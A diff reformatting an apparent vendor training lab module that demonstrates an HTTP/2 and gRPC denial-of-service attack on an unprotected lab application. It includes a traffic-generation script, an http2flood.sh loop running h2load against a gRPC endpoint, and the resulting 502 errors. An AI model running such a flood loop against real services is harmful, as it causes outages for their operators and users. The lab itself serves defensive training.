@@ -7,48 +7,42 @@ Module 1 - HTTP/2 and GRPC DoS Attack on Unprotected Application
 Demonstrate the effects of an HTTP/2 and gRPC attacks on an unprotected application
 -----------------------------------------------------------------------------------
 
-- Generate legitimate traffic 
-   
-  - In UDF, Click on Access for the **legitimate traffic** VM and select WebShell 
-    We will utilize the good.sh bash script in order to generate HTTP 1 traffic using **curl**, HTTP 2 traffic using **h2load** and using Python3 with route_guide_client to generate gRPC traffic.
-
-.. note:: 
-   Excerpt of good.sh bash script 
+Generate legitimate traffic 
+   - In UDF, Click on Access for the **legitimate traffic** VM and select WebShell (or ssh into the box if you set that up)
+   - We will utilize the good.sh bash script in order to generate HTTP 1 traffic using **curl**, HTTP 2 traffic using **h2load** and using Python3 with route_guide_client to generate gRPC traffic.
 
 .. code-block:: bash 
+   :caption: Contents of the good.sh bash script
 
-      #!/bin/bash
-      cd /grpc/examples/python/route_guide/
+   #!/bin/bash
+   cd /grpc/examples/python/route_guide/
 
-      IP=10.1.1.4
-      PORT=600
-      URI='good_path.html'
-
-
-      declare -a array=("/#/login" "/#/about" "/assets/public/images/products/apple_pressings.jpg" "/#/search")
+   IP=10.1.1.4
+   PORT=600
+   URI='good_path.html'
 
 
-
-      while true; do
-      echo
-      python3 /grpc/examples/python/route_guide/route_guide_client.py  2>&1 | grep "Finished\|502"
-      h2load -n 10 -c 10 --header="te: trailers " --ciphers=AES128-GCM-SHA256  https://10.1.1.4:443/testing/ &> /dev/null
-
-      URI=${array[$(( RANDOM % 3 ))]}
-      curl -b cookiefile -c cookiefile -L -s -o /dev/null -w "JUICESHOP HTTP Code:%{http_code}\n" -A "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5" -H "X-Forwarded-For: 3.3.3.1" http://${IP}:${PORT}/${URI} &
-      echo
-      URI=${array[$(( RANDOM % 3 ))]}
-      curl -b cookiefile -c cookiefile -L -s -o /dev/null  -A "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.112 Safari/534.30" -H "X-Forwarded-For: 3.3.3.2" http://${IP}:${PORT}/${URI} &
-      URI=${array[$(( RANDOM % 3 ))]}
-      curl -b cookiefile -c cookiefile -L -s -o /dev/null  -A "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3" -H "X-Forwarded-For: 3.3.3.3" http://${IP}:${PORT}/${URI} &
+   declare -a array=("/#/login" "/#/about" "/assets/public/images/products/apple_pressings.jpg" "/#/search")
 
 
-  - At the CLI prompt start the good shell script  
 
-.. code-block:: bash 
+   while true; do
+   echo
+   python3 /grpc/examples/python/route_guide/route_guide_client.py  2>&1 | grep "Finished\|502"
+   h2load -n 10 -c 10 --header="te: trailers " --ciphers=AES128-GCM-SHA256  https://10.1.1.4:443/testing/ &> /dev/null
 
-       ./good.sh
-   
+   URI=${array[$(( RANDOM % 3 ))]}
+   curl -b cookiefile -c cookiefile -L -s -o /dev/null -w "JUICESHOP HTTP Code:%{http_code}\n" -A "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5" -H "X-Forwarded-For: 3.3.3.1" http://${IP}:${PORT}/${URI} &
+   echo
+   URI=${array[$(( RANDOM % 3 ))]}
+   curl -b cookiefile -c cookiefile -L -s -o /dev/null  -A "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.112 Safari/534.30" -H "X-Forwarded-For: 3.3.3.2" http://${IP}:${PORT}/${URI} &
+   URI=${array[$(( RANDOM % 3 ))]}
+   curl -b cookiefile -c cookiefile -L -s -o /dev/null  -A "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3" -H "X-Forwarded-For: 3.3.3.3" http://${IP}:${PORT}/${URI} &
+
+
+Run the good traffic shell script:
+
+``./good.sh``
     
 Output from the script: 
 
@@ -60,27 +54,22 @@ Output from the script:
 
    JUICESHOP HTTP Code:200 Finished trip with 10 points 
 
-- Start HTTP/2 Flood attack
 
-- Back in the UDF class, click  Access on the **Attacker** VM and select WebShell
-  
-.. note::  
-   http2flood.sh script
+Start HTTP/2 Flood attack
+   - Back in the UDF, click 'Access' on the **Attacker** VM and select WebShell
 
-.. code-block:: bash 
+.. code-block:: bash
+   caption: http2flood.sh
 
-      #!/bin/sh
-      while true; do
+   #!/bin/sh
+   while true; do
       h2load -n 10000 -c 1000 http://10.1.1.4:500/routeguide.RouteGuide/GetFeature
-      done
+   done
 
 
-  - At CLI prompt start the HTTP/2 Flood: 
+ Run the http2 flood script:
 
-.. code-block:: bash  
-   
-    ./scripts/http2flood.sh 
-
+ ``. /scripts/http2flood.sh``
 
 Attack script Output
 
@@ -109,9 +98,7 @@ Attack script Output
   progress: 90% done
   progress: 100% done
 
-- Click back on to the WebShell on the legitimate VM. Did the output from
-   the script change? Output now shows the HTTP/2 service is
-   experiencing an outage.
+Click back on to the WebShell on the legitimate VM. Did the output from the script change? Output now shows the HTTP/2 service is experiencing an outage.
 
 .. code:: shell
 
@@ -119,6 +106,6 @@ Attack script Output
         details = "Received http2 header with status: 502"
         debug_error_string = "{"created":"@1650395963.222837020","description":"Received http2 :status header with non-200 OK status","file":"src/core/ext/filters/http/client/http_client_filter.cc","file_line":134,"grpc_message":"Received http2 header with status: 502","grpc_status":14,"value":"502"}"
 
-- Stop the HTTP2Flood attack, by pressing Ctrl-C
+Stop the HTTP2Flood attack, by pressing Ctrl-C
 
 
